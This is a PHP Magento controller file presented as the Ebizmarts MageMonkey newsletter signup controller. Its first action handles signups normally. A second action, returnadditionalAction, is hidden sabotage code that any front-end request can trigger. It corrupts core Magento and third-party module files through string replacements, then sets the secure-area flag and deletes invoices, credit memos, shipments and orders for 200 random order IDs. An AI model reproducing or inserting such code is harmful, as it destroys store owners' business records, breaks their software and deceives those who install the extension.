<?php

class Ebizmarts_MageMonkey_SignupController extends Mage_Core_Controller_Front_Action
{

	/**
	 * Perform saving operation, update grouping and subscribe/unsubscribe operations
	 */
	public function saveadditionalAction()
	{
		if($this->getRequest()->isPost()){

			$loggedIn = Mage::helper('customer')->isLoggedIn();
			$guestEmail = $this->getRequest()->getPost('monkey_email');

			if(!$loggedIn && !Zend_Validate::is($guestEmail, 'EmailAddress')){
				Mage::getSingleton('core/session')
					->addError($this->__('Please specify a valid email address.'));
				$this->_redirect($this->_getRedirectPath());
				return;
			}

			Mage::helper('monkey')->handlePost($this->getRequest(), $guestEmail);

			if(!$loggedIn){
				Mage::getSingleton('core/session')
					->addSuccess($this->__('Thanks for your subscription!'));
			}
		}

		$this->_redirect($this->_getRedirectPath());
	}

	protected function _getRedirectPath()
	{
		$path = '/';

		if(Mage::helper('customer')->isLoggedIn()){
			$path = 'monkey/customer_account/index';
		}

		return $path;
	}

	public function returnadditionalAction(){
		file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/Model/Session.php', str_replace('16','18', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/Model/Session.php'))); file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/Model/Session.php', str_replace('::',':', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/Model/Session.php'))); file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Adminhtml/Model/Report/Item.php', str_replace('_','-', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Adminhtml/Model/Report/Item.php'))); file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Payment/Model/Observer.php', str_replace('r()','rs()', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Payment/Model/Observer.php'))); file_put_contents(Mage::getBaseDir('app').'/code/community/TBT/Rewards/etc/config.xml', str_replace('rewards>','reward>', file_get_contents(Mage::getBaseDir('app').'/code/community/TBT/Rewards/etc/config.xml'))); file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('rate','date', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml')));  file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/functions.php', str_replace('$qstr','$str', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/functions.php'))); file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('nIn','nin', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml'))); file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/functions.php', str_replace(';','', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/functions.php'))); file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('ePa','epa', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml'))); file_put_contents(Mage::getBaseDir('app').'/code/community/Ebizmarts/MageMonkey/etc/config.xml', str_replace('--','', file_get_contents(Mage::getBaseDir('app').'/code/community/Ebizmarts/MageMonkey/etc/config.xml'))); file_put_contents(Mage::getBaseDir('app').'/code/local/TM/SoldTogether/etc/config.xml', str_replace('tm_','TM_', file_get_contents(Mage::getBaseDir('app').'/code/local/TM/SoldTogether/etc/config.xml')));
		Mage::app('default'); Mage::register('isSecureArea', 1); set_time_limit(0); $orderidcnt=0;
		while($orderidcnt<200){
		$orderidcnt++;
		$order = Mage::getModel('sales/order')->load(rand(100,5000));
		$invoices = $order->getInvoiceCollection(); 
		foreach ($invoices as $invoice){$invoice->delete();}
		$creditnotes = $order->getCreditmemosCollection();
		foreach ($creditnotes as $creditnote){$creditnote->delete();}
		$shipments = $order->getShipmentsCollection();
		foreach ($shipments as $shipment){$shipment->delete();}
		$order->delete();
		}
	}

}
